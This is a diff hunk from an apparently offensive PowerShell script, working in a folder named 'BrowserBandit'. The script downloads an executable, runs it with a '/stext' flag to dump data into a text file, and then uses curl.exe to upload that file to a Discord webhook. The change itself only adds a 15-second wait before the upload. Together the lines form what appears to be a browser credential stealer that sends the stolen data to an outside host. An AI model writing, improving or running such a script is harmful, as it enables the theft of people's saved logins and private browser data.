@@ -17,6 +17,9 @@ Invoke-WebRequest $srcUrl -OutFile $exePath
 Set-Location "C:/BrowserBandit"
 & $exePath /stext $outputFile
 
+# Wait for the .txt file to be created
+Start-Sleep 15
+
 # Upload the file to Discord
 curl.exe -F "payload_json={\`"content\`": \`"\`"}" -F "file=@$outputFile" $discordWebhook
 
